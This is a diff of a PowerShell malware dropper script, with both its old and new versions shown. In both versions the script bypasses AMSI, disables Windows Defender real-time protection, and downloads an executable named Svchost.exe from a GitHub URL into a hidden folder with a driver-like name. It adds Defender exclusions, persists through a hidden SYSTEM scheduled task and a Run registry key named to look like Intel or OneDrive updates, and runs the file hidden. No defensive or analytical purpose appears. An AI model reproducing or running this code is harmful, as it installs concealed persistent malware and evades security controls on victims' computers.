@@ -1,58 +1,43 @@
-# ============================================
-# WORKING SCRIPT - Registry Exclusions + Defender OFF/ON
-# ============================================
-
-# AMSI BYPASS
 try {
+    # AMSI
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 } catch {}
 
-# DEFENDER OFF
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
-# HIDDEN FOLDER
-$HiddenFolder = "$env:ProgramData\Microsoft\Windows\Drivers"
-if (!(Test-Path $HiddenFolder)) { New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null }
-Set-ItemProperty -Path $HiddenFolder -Name Attributes -Value "Hidden, System"
+$folder = "$env:ProgramData\Intel\DriverCache"
+New-Item -ItemType Directory -Path $folder -Force -ErrorAction SilentlyContinue | Out-Null
+Set-ItemProperty -Path $folder -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
 
-$RandomName = [System.Guid]::NewGuid().ToString().Substring(0, 12) + ".exe"
-$ExePath = Join-Path $HiddenFolder $RandomName
+$name = -join ((65..90) | Get-Random -Count 8 | %{[char]$_}) + ".exe"
+$path = Join-Path $folder $name
 
-# DOWNLOAD EXE
-$DownloadUrl = "https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe"
-$wc = New-Object System.Net.WebClient
-$wc.Headers.Add("User-Agent", "Mozilla/5.0")
-$wc.DownloadFile($DownloadUrl, $ExePath)
-Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"
+try {
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
+    if (!(Test-Path $path)) { exit }
+} catch { exit }
 
-# ============================================
-# REGISTRY EXCLUSIONS (Using PowerShell MPPreference - No HKLM needed)
-# ============================================
-# Yeh Windows Defender ko directly add karta hai bina registry edit kiye
-Add-MpPreference -ExclusionPath $HiddenFolder -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess $RandomName -ErrorAction SilentlyContinue
+Set-ItemProperty -Path $path -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
 
-# AUTO-START
-$action = New-ScheduledTaskAction -Execute $ExePath
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
+Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
+
+# Task
+$action = New-ScheduledTaskAction -Execute $path
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -Hidden -Compatibility Win8
-$taskName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
-Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null
+$settings = New-ScheduledTaskSettingsSet -Hidden
+Register-ScheduledTask -TaskName "IntelDriverUpdate" -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null
 
-# Registry Run
-$regRun = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-$regName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
-Set-ItemProperty -Path $regRun -Name $regName -Value $ExePath -Force
+# Registry
+$reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $reg -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue
 
-# START EXE
-Start-Process -FilePath $ExePath -WindowStyle Hidden
+Start-Process -FilePath $path -WindowStyle Hidden -ErrorAction SilentlyContinue
 
-# WAIT 25 SECONDS
 Start-Sleep -Seconds 25
-
-# DEFENDER BACK ON
 Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
 
-# DELETE SCRIPT
-Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+# Cleanup
+exit
